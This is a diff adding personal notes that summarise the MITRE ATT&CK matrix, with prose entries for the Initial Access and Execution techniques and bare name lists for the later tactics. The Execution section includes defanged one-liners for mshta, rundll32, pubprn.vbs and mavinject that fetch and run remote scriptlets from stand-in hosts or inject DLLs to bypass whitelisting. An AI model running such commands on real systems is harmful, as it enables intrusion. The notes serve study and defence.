@@ -1,0 +1,745 @@
+-------------------------------------
+INITIAL ACCESS
+-------------------------------------
+
+$ Drive-by Compromise
+A drive-by compromise is when an adversary gains access to a system through a user visiting a website over the normal course of browsing.
+Multiple ways of delivering exploit code to a browser exist, including:
+    > A legitimate website injected with JavaScript, iFrames, XSS.
+    > Malicious ads
+    > Built-in web application interfaces (e.g. forum posts, comments, and other user controllable web content)
+
+$ Exploit Public-Facing Application
+The use of software, data, or commands to take advantage of a weakness in an Internet-facing computer system or program in order to cause unintended or unanticipated behavior. 
+The weakness in the system can be a bug, a glitch, or a design vulnerability.
+
+$ Hardware Additions	
+Commercial and open source products are leveraged with capabilities such as passive network tapping6, man-in-the middle encryption breaking7, keystroke injection8, kernel memory reading via DMA9, adding new wireless access to an existing network10, and others.
+
+$ Replication Through Removable Media
+Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.
+
+$ Spearphishing Attachment
+In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment, the adversary's payload exploits a vulnerability or directly executes on the user's system.
+
+$ Spearphishing Link
+It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email. 
+
+$ Spearphishing via Service
+It employs the use of third party services rather than directly via enterprise email channels.
+
+$ Supply Chain Compromise
+Manipulation of products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise can take place at any stage of the supply chain including:
+    Manipulation of development tools
+    Manipulation of a development environment
+    Manipulation of source code repositories (public or private)
+    Manipulation of software update/distribution mechanisms
+    Compromised/infected system images (multiple cases of removable media infected at the factory)
+    Replacement of legitimate software with modified versions
+    Sales of modified/counterfeit products to legitimate distributors
+    Shipment interdiction
+
+$ Trusted Relationship
+Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). 
+
+$ Valid Accounts	
+Adversaries may steal the credentials of a specific user or service account using Credential Access techniques or capture credentials earlier in their reconnaissance process through social engineering for means of gaining Initial Access.
+
+-------------------------------------
+EXECUTION
+-------------------------------------
+
+AppleScript
+
+macOS and OS X applications send AppleEvent messages to each other for interprocess communications (IPC). These messages can be easily scripted with AppleScript for local or remote IPC. Osascript executes AppleScript and any other Open Scripting Architecture (OSA) language scripts. A list of OSA languages installed on a system can be found by using the osalang program.
+
+CMSTP
+The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.
+Adversaries may supply CMSTP.exe with INF files infected with malicious commands.3 Similar to Regsvr32 / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs4 and/or COM scriptlets (SCT) from remote servers.56 This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application.
+CMSTP.exe can also be abused to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.
+
+Command-Line Interface	
+	Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms.7 One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. Scheduled Task). Adversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.
+
+Control Panel Items	Defense Evasion
+Windows Control Panel items are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function.89 Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.8910
+
+For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.
+Adversaries can use Control Panel items as execution payloads to execute arbitrary commands. Malicious Control Panel items can be delivered via Spearphishing Attachment campaigns 910 or executed as part of multi-stage malware.11 Control Panel items, specifically CPL files, may also bypass application and/or file extension whitelisting.
+
+Dynamic Data Exchange
+Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.
+
+Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by COM, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.
+Adversaries may use DDE to execute arbitrary commands. Microsoft Office documents can be poisoned with DDE commands1516, directly or through embedded files17, and used to deliver execution via phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.18 DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to command line execution.
+
+Execution through API
+Adversary tools may directly use the Windows application programming interface (API) to execute binaries. Functions such as the Windows API CreateProcess will allow programs and scripts to start other processes with proper path and argument parameters.
+
+Additional Windows API calls that can be used to execute binaries include:
+
+    CreateProcessA() and CreateProcessW(),
+    CreateProcessAsUserA() and CreateProcessAsUserW(),
+    CreateProcessInternalA() and CreateProcessInternalW(),
+    CreateProcessWithLogonW(), CreateProcessWithTokenW(),
+    LoadLibraryA() and LoadLibraryW(),
+    LoadLibraryExA() and LoadLibraryExW(),
+    LoadModule(),
+    LoadPackagedLibrary(),
+    WinExec(),
+    ShellExecuteA() and ShellExecuteW(),
+    ShellExecuteExA() and ShellExecuteExW()
+
+Execution through Module Load	
+The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like CreateProcess(), LoadLibrary(), etc. of the Win32 API.21
+
+The module loader can load DLLs:
+
+    via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;
+    via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);
+    via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;
+    via <file name="filename.extension" loadFrom="fully-qualified or relative pathname"> in an embedded or external "application manifest". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.
+
+Adversaries can use this functionality as a way to execute arbitrary code on a system.
+
+Exploitation for Client Execution
+Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.
+
+Several types exist:
+	Browser-based Exploitation - Web browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.
+	Office Applications - Common office and productivity applications such as Microsoft Office are also targeted through Spearphishing Attachment, Spearphishing Link, and Spearphishing via Service. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.
+	Common Third-party Applications - Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.
+
+Graphical User Interface	
+Cause a binary or script to execute based on interacting with the file through a graphical user interface (GUI) or in an interactive remote session such as Remote Desktop Protocol.
+
+InstallUtil	
+InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.22 InstallUtil is located in the .NET directories on a Windows system: C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe and C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe. InstallUtil.exe is digitally signed by Microsoft. Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil may also be used to bypass process whitelisting through use of attributes within the binary that execute the class decorated with the attribute [System.ComponentModel.RunInstaller(true)].23
+
+LSASS Driver	
+The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.24 Adversaries may target lsass.exe drivers to obtain execution and/or persistence. By either replacing or adding illegitimate drivers (e.g., DLL Side-Loading or DLL Search Order Hijacking), an adversary can achieve arbitrary code execution triggered by continuous LSA operations.
+
+Launchctl
+Launchctl controls the macOS launchd process which handles things like launch agents and launch daemons, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input. By loading or reloading launch agents or launch daemons, adversaries can install persistence or execute changes they made 25. Running a command from launchctl is as simple as launchctl submit -l <labelName> -- /Path/to/thing/to/execute "arg" "arg" "arg". Loading, unloading, or reloading launch agents or launch daemons can require elevated privileges. Adversaries can abuse this functionality to execute code or even bypass whitelisting if launchctl is an allowed process.
+
+Local Job Scheduling
+On Linux and Apple systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron,26 at,27 and launchd.28 Unlike Scheduled Task on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).
+	cron - System-wide cron jobs are installed by modifying /etc/crontab file, /etc/cron.d/ directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files.28 This works on Mac and Linux systems.Those methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction.
+	at - The at program is another means on Linux-based systems, including Mac, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.
+	launchd - Each launchd job is described by a different configuration property list (plist) file similar to Launch Daemon or Launch Agent, except there is an additional key called StartCalendarInterval with a dictionary of time values.28 This only works on macOS and OS X.
+
+Mshta
+Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension {.hta}. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.
+
+Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code
+
+Files may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))
+
+They may also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta
+Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.40
+
+PowerShell
+PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.41 Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer.
+
+PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.
+
+Administrator permissions are required to use PowerShell to connect to remote systems.
+A number of PowerShell-based offensive testing tools are available, including Empire,42 PowerSploit,43 and PSAttack.44
+
+Regsvcs/Regasm
+Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft.4546 Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: [ComRegisterFunction] or [ComUnregisterFunction] respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute.23
+Regsvr32
+Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries.47
+
+Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.
+
+Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.48 This variation of the technique is often referred to as a "Squiblydoo" attack and has been used in campaigns targeting governments.4950
+Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via Component Object Model Hijacking.49
+
+Rundll32	
+The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.
+
+Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute.51
+Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")" This behavior has been seen used by malware such as Poweliks.52
+
+Scheduled Task
+Utilities such as at and schtasks, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the the remote system.53 An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.
+
+Scripting	
+Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.
+
+Scripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macos being allowed or that the user will accept to activate them.
+Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit54, Veil55, and PowerSploit43 are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell.56
+
+Service Execution	
+Adversaries may execute a binary, command, or script via a method that interacts with Windows services, such as the Service Control Manager. This can be done by either creating a new service or modifying an existing service. This technique is the execution used in conjunction with New Service and Modify Existing Service during service persistence or privilege escalation.
+
+Signed Binary Proxy Execution	
+Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.
+
+	Mavinject.exe - Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process.
+
+"C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" <PID> /INJECTRUNNING <PATH DLL>
+
+C:\Windows\system32\mavinject.exe <PID> /INJECTRUNNING <PATH DLL>
+	SyncAppvPublishingServer.exe - SyncAppvPublishingServer.exe can be used to run powershell scripts without executing powershell.exe.
+Several others binaries exist that may be used to perform similar behavior.
+
+Signed Script Proxy Execution
+Scripts signed with trusted certificates can be used to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application whitelisting solutions that do not account for use of these scripts.
+
+PubPrn.vbs is signed by Microsoft and can be used to proxy execution from a remote site.59 Example command: cscript C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png
+There are several other signed scripts that may be used in a similar manner.6
+Source	
+The source command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways source /path/to/filename [arguments] or . /path/to/filename [arguments]. Take note of the space after the ".". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment. Adversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.
+
+Space after Filename
+Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to "evil.txt " (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed60. Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.
+
+Third-party Software	
+Third-party applications and software deployment systems may be in use in the network environment for administration purposes (e.g., SCCM, VNC, HBSS, Altiris, etc.). If an adversary gains access to these systems, then they may be able to execute code.
+
+Adversaries may gain access to and use third-party application deployment systems installed within an enterprise network. Access to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.
+The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.
+
+Trap
+The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format trap 'command list' signals where "command list" will be executed when "signals" are received.
+
+Trusted Developer Utilities	
+There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application whitelisting defensive solutions.
+	MSBuild - MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It takes XML formatted project files that define requirements for building various platforms and configurations.61
+
+Adversaries can use MSBuild to proxy execution of code through a trusted Windows utility. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into the XML project file.62 MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application whitelisting defenses that are configured to allow MSBuild.exe execution.23
+
+	DNX - The .NET Execution Environment (DNX), dnx.exe, is a software development kit packaged with Visual Studio Enterprise. It was retired in favor of .NET Core CLI in 2016.63 DNX is not present on standard builds of Windows and may only be present on developer workstations using older versions of .NET Core and ASP.NET Core 1.0. The dnx.exe executable is signed by Microsoft.
+
+An adversary can use dnx.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for DNX.
+	RCSI - The rcsi.exe utility is a non-interactive command-line interface for C# that is similar to csi.exe. It was provided within an early version of the Roslyn .NET Compiler Platform but has since been deprecated for an integrated solution. The rcsi.exe binary is signed by Microsoft.
+
+	C# .csx script files can be written and executed with rcsi.exe at the command-line. An adversary can use rcsi.exe to proxy execution of arbitrary code to bypass application whitelisting policies that do not account for execution of rcsi.exe.
+	WinDbg/CDB - WinDbg is a Microsoft Windows kernel and user-mode debugging utility. The Microsoft Console Debugger (CDB) cdb.exe is also user-mode debugger. Both utilities are included in Windows software development kits and can be used as standalone tools.67 They are commonly used in software development and reverse engineering and may not be found on typical Windows systems. Both WinDbg.exe and cdb.exe binaries are signed by Microsoft.
+
+	An adversary can use WinDbg.exe and cdb.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for execution of those utilities.
+
+	It is likely possible to use other debuggers for similar purposes, such as the kernel-mode debugger kd.exe, which is also signed by Microsoft.
+	
+	Tracker - The file tracker utility, tracker.exe, is included with the .NET framework as part of MSBuild. It is used for logging calls to the Windows file system.
+	An adversary can use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.
+
+User Execution	
+An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via Spearphishing Attachment with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via Spearphishing Link that leads to exploitation of a browser or application vulnerability via Exploitation for Client Execution. While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.
+
+Windows Management Instrumentation	
+Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) and Remote Procedure Call Service (RPCS) for remote access. RPCS operates over port 135. An adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement.
+
+Windows Remote Management
+Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the winrm command or by any number of programs such as PowerShell.
+
+-------------------------------------
+PERSISTENCE
+-------------------------------------
+
+.bash_profile and .bashrc
+
+Accessibility Features
+
+AppCert DLLs
+
+AppInit DLLs
+
+Application Shimming
+
+Authentication Package
+
+BITS Jobs
+
+Bootkit
+
+Browser Extensions
+
+Change Default File Association
+
+Component Firmware
+
+Component Object Model Hijacking
+
+Create Account
+
+DLL Search Order Hijacking
+
+Dylib Hijacking
+
+External Remote Services
+
+File System Permissions Weakness
+
+Hidden Files and Directories
+
+Hooking
+
+Hypervisor
+
+Image File Execution Options Injection
+
+Kernel Modules and Extensions
+
+LC_LOAD_DYLIB Addition
+
+LSASS Driver
+
+Launch Agent
+
+Launch Daemon
+
+Launchctl
+
+Local Job Scheduling
+
+Login Item
+
+Logon Scripts
+
+Modify Existing Service
+
+Netsh Helper DLL
+
+New Service
+
+Office Application Startup
+
+Path Interception
+
+Plist Modification
+
+Port Knocking
+
+Port Monitors
+
+Rc.common
+
+Re-opened Applications
+
+Redundant Access
+
+Registry Run Keys / Start Folder
+
+SIP and Trust Provider Hijacking
+
+Scheduled Task
+
+Screensaver
+
+Security Support Provider
+
+Service Registry Permissions Weakness
+
+Shortcut Modification
+
+Startup Items
+
+System Firmware
+
+Time Providers
+
+Trap
+
+Valid Accounts
+
+Web Shell
+
+Windows Management Instrumentation Event Subscription
+
+Winlogon Helper DLL
+-------------------------------------
+PRIVILEGE ESCALATION
+-------------------------------------
+
+Access Token Manipulation
+
+Accessibility Features
+
+AppCert DLLs
+
+AppInit DLLs
+
+Application Shimming
+
+Bypass User Account Control
+
+DLL Search Order Hijacking
+
+Dylib Hijacking
+
+Exploitation for Privilege Escalation
+
+Extra Window Memory Injection
+
+File System Permissions Weakness
+
+Hooking
+
+Image File Execution Options Injection
+
+Launch Daemon
+
+New Service
+
+Path Interception
+
+Plist Modification
+
+Port Monitors
+
+Process Injection
+
+SID-History Injection
+
+Scheduled Task
+
+Service Registry Permissions Weakness
+
+Setuid and Setgid
+
+Startup Items
+
+Sudo
+
+Sudo Caching
+
+Valid Accounts
+
+Web Shell
+-------------------------------------
+DEFENSE EVASION
+-------------------------------------
+
+Access Token Manipulation
+
+BITS Jobs
+
+Binary Padding
+
+Bypass User Account Control
+
+CMSTP
+
+Clear Command History
+
+Code Signing
+
+Component Firmware
+
+Component Object Model Hijacking
+
+Control Panel Items
+
+DCShadow
+
+DLL Search Order Hijacking
+
+DLL Side-Loading
+
+Deobfuscate/Decode Files or Information
+
+Disabling Security Tools
+
+Exploitation for Defense Evasion
+
+Extra Window Memory Injection
+
+File Deletion
+
+File System Logical Offsets
+
+Gatekeeper Bypass
+
+HISTCONTROL
+
+Hidden Files and Directories
+
+Hidden Users
+
+Hidden Window
+
+Image File Execution Options Injection
+
+Indicator Blocking
+
+Indicator Removal from Tools
+
+Indicator Removal on Host
+
+Indirect Command Execution
+
+Install Root Certificate
+
+InstallUtil
+
+LC_MAIN Hijacking
+
+Launchctl
+
+Masquerading
+
+Modify Registry
+
+Mshta
+
+NTFS File Attributes
+
+Network Share Connection Removal
+
+Obfuscated Files or Information
+
+Plist Modification
+
+Port Knocking
+
+Process Doppelgänging
+
+Process Hollowing
+
+Process Injection
+
+Redundant Access
+
+Regsvcs/Regasm
+
+Regsvr32
+
+Rootkit
+
+Rundll32
+
+SIP and Trust Provider Hijacking
+
+Scripting
+
+Signed Binary Proxy Execution
+
+Signed Script Proxy Execution
+
+Software Packing
+
+Space after Filename
+
+Timestomp
+
+Trusted Developer Utilities
+
+Valid Accounts
+
+Web Service
+-------------------------------------
+CREDENTIAL ACCESS
+-------------------------------------
+
+Account Manipulation
+
+Bash History
+
+Brute Force
+
+Credential Dumping
+
+Credentials in Files
+
+Credentials in Registry
+
+Exploitation for Credential Access
+
+Forced Authentication
+
+Hooking
+
+Input Capture
+
+Input Prompt
+
+Kerberoasting
+
+Keychain
+
+LLMNR/NBT-NS Poisoning
+
+Network Sniffing
+
+Password Filter DLL
+
+Private Keys
+
+Securityd Memory
+
+Two-Factor Authentication Interception
+-------------------------------------
+DISCOVERY
+-------------------------------------
+
+Account Discovery
+
+Application Window Discovery
+
+Browser Bookmark Discovery
+
+File and Directory Discovery
+
+Network Service Scanning
+
+Network Share Discovery
+
+Password Policy Discovery
+
+Peripheral Device Discovery
+
+Permission Groups Discovery
+
+Process Discovery
+
+Query Registry
+
+Remote System Discovery
+
+Security Software Discovery
+
+System Information Discovery
+
+System Network Configuration Discovery
+
+System Network Connections Discovery
+
+System Owner/User Discovery
+
+System Service Discovery
+
+System Time Discovery
+-------------------------------------
+LATERAL MOVEMENT
+-------------------------------------
+
+AppleScript
+
+Application Deployment Software
+
+Distributed Component Object Model
+
+Exploitation of Remote Services
+
+Logon Scripts
+
+Pass the Hash
+
+Pass the Ticket
+
+Remote Desktop Protocol
+
+Remote File Copy
+
+Remote Services
+
+Replication Through Removable Media
+
+SSH Hijacking
+
+Shared Webroot
+
+Taint Shared Content
+
+Third-party Software
+
+Windows Admin Shares
+
+Windows Remote Management
+-------------------------------------
+COLLECTION
+-------------------------------------
+
+Audio Capture
+
+Automated Collection
+
+Clipboard Data
+
+Data Staged
+
+Data from Information Repositories
+
+Data from Local System
+
+Data from Network Shared Drive
+
+Data from Removable Media
+
+Email Collection
+
+Input Capture
+
+Man in the Browser
+
+Screen Capture
+
+Video Capture
+-------------------------------------
+EXFILTRATION
+-------------------------------------
+
+Automated Exfiltration
+
+Data Compressed
+
+Data Encrypted
+
+Data Transfer Size Limits
+
+Exfiltration Over Alternative Protocol
+
+Exfiltration Over Command and Control Channel
+
+Exfiltration Over Other Network Medium
+
+Exfiltration Over Physical Medium
+
+Scheduled Transfer
+-------------------------------------
+COMMAND AND CONTROL
+-------------------------------------
+Commonly Used Port
+
+Communication Through Removable Media
+
+Connection Proxy
+
+Custom Command and Control Protocol
+
+Custom Cryptographic Protocol
+
+Data Encoding
+
+Data Obfuscation
+
+Domain Fronting
+
+Fallback Channels
+
+Multi-Stage Channels
+
+Multi-hop Proxy
+
+Multiband Communication
+
+Multilayer Encryption
+
+Port Knocking
+
+Remote Access Tools
+
+Remote File Copy
+
+Standard Application Layer Protocol
+
+Standard Cryptographic Protocol
+
+Standard Non-Application Layer Protocol
+
+Uncommonly Used Port
+
+Web Service
